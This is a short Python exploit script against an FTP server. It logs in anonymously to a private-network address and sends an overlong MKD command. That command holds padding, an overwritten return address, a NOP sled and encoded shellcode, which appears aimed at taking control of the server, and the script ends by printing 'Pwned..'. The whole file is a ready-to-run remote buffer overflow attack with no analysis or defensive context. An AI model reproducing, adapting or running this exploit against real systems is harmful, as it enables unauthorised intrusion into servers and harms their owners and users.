#!/usr/bin/python

import socket

shellcode = ("\xbe\xa2\x53\x01\xed\xd9\xd0\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x54\x31\x72\x13\x03\x72\x13\x83\xc2\xa6\xb1\xf4\x11\x4e\xb7"
"\xf7\xe9\x8e\xd8\x7e\x0c\xbf\xd8\xe5\x44\xef\xe8\x6e\x08\x03"
"\x82\x23\xb9\x90\xe6\xeb\xce\x11\x4c\xca\xe1\xa2\xfd\x2e\x63"
"\x20\xfc\x62\x43\x19\xcf\x76\x82\x5e\x32\x7a\xd6\x37\x38\x29"
"\xc7\x3c\x74\xf2\x6c\x0e\x98\x72\x90\xc6\x9b\x53\x07\x5d\xc2"
"\x73\xa9\xb2\x7e\x3a\xb1\xd7\xbb\xf4\x4a\x23\x37\x07\x9b\x7a"
"\xb8\xa4\xe2\xb3\x4b\xb4\x23\x73\xb4\xc3\x5d\x80\x49\xd4\x99"
"\xfb\x95\x51\x3a\x5b\x5d\xc1\xe6\x5a\xb2\x94\x6d\x50\x7f\xd2"
"\x2a\x74\x7e\x37\x41\x80\x0b\xb6\x86\x01\x4f\x9d\x02\x4a\x0b"
"\xbc\x13\x36\xfa\xc1\x44\x99\xa3\x67\x0e\x37\xb7\x15\x4d\x5f"
"\x74\x14\x6e\x9f\x12\x2f\x1d\xad\xbd\x9b\x89\x9d\x36\x02\x4d"
"\xe2\x6c\xf2\xc1\x1d\x8f\x03\xcb\xd9\xdb\x53\x63\xc8\x63\x38"
"\x73\xf5\xb1\xd5\x76\x61\xfa\x82\x8b\xfd\x92\xd0\x6b\xec\x3e"
"\x5c\x8d\x5e\xef\x0e\x02\x1e\x5f\xef\xf2\xf6\xb5\xe0\x2d\xe6"
"\xb5\x2a\x46\x8c\x59\x83\x3e\x38\xc3\x8e\xb5\xd9\x0c\x05\xb0"
"\xd9\x87\xac\x44\x97\x6f\xc4\x56\xcf\x11\x26\xa7\x0f\xb8\x26"
"\xcd\x0b\x6a\x70\x79\x11\x4b\xb6\x26\xea\xbe\xc4\x21\x14\x3f"
"\xfd\x5a\x22\xd5\x41\x35\x4a\x39\x42\xc5\x1c\x53\x42\xad\xf8"
"\x07\x11\xc8\x07\x92\x05\x41\x9d\x1d\x7c\x35\x36\x76\x82\x60"
"\x70\xd9\x7d\x47\x03\x1e\x81\x15\x21\x87\xea\xe5\x65\x37\xeb"
"\x8f\x65\x67\x83\x44\x4a\x88\x63\xa4\x41\xc1\xeb\x2f\x07\xa3"
"\x8a\x30\x02\x65\x13\x30\xa0\xbe\x42\xbf\x47\x41\x6b\x41\x74"
"\x97\x52\x37\xbd\x2b\xe1\x48\xf4\x0e\x40\xc3\xf6\x1d\x92\xc6")

nop = '\x90'*24

buffer = nop + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(('192.168.242.135',21))


evil = 'A'*247 + '\x53\x93\x42\x7E' +  buffer + 'C'*(749-len(buffer))

s.recv(1024)
s.send('USER anonymous\r\n')
#print s.recv(1024)
s.send('PASS anonymous\r\n')
#print s.recv(1024)
s.send('MKD ' + evil + '\r\n')
#print s.recv(1024)
s.send('QUIT\r\n')
s.close

print "Exploiting..."
print "Pwned.."
